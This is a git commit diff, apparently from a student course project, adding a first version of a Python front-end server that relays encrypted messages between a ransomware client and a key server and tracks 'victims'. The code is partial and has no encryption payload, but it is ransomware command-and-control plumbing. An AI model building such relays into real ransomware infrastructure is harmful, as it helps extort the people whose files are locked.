a079b88ac2a913c3f77ceb8b481710ba27e3b50f
Longle Julien <j.longle@student.helmo.be>
2024-04-11 11:37:57 +0200

    Première version frontal

--- serveur_frontal/serveur_frontal.py
+++ serveur_frontal/serveur_frontal.py
@@ -1,25 +1,47 @@
-import queue
-import threading
-from threading import Thread, Lock
+# import queue
+# import threading
+# from threading import Thread, Lock
 import utile.network as network
 import utile.message as message
 import utile.security as security
 # import utile.input as my_input
-import utile.config as config
+# import utile.config as config
 
 # Constantes
 IP_SERV_CLES = ''
-PORT_SERV_CLES = 0
+PORT_SERV_CLES = 8381
 CONN_RETRY_SERV_CLES = 0
 IP_RANSOMWARE = ''
-PORT_RANSOMWARE = 0
+PORT_RANSOMWARE = 8443
 CONFIG_SERVEUR = {}
 CONFIG_WORKSTATION = {}
 
 # Variable globale
 status_victims = {}
 
-def main():
 
-    if __name__ == '__main__':
-        main()
+def main():
+    while True:
+        socket_ransomware = network.connect_to_serv(IP_RANSOMWARE, PORT_RANSOMWARE)
+        key = security.diffie_hellman_send_key(socket_ransomware)
+        encrypted_message_ransomware = network.receive_message(socket_ransomware)
+        message_ransomware = security.aes_decrypt(encrypted_message_ransomware, key)
+        if message_ransomware is None:
+            print("Aucun message reçu, connexion fermée.")
+            socket_ransomware.close()
+            continue
+        print(f"Message reçu: {message_ransomware}")
+        print(f"Message de type: {message.get_message_type(message_ransomware)}")
+        type_message = message.get_message_type(message_ransomware)
+        if type_message == "INITIALIZE":
+            socket_serv_cle = network.connect_to_serv(IP_SERV_CLES, PORT_SERV_CLES, CONN_RETRY_SERV_CLES)
+            key_serv_cle = security.diffie_hellman_send_key(socket_serv_cle)
+            message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
+            network.send_message(socket_serv_cle, message_serv_cle_crypt)
+            response_serv_cle_crypt = network.receive_message(socket_serv_cle)
+            response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
+
+
+
+if __name__ == '__main__':
+    main()
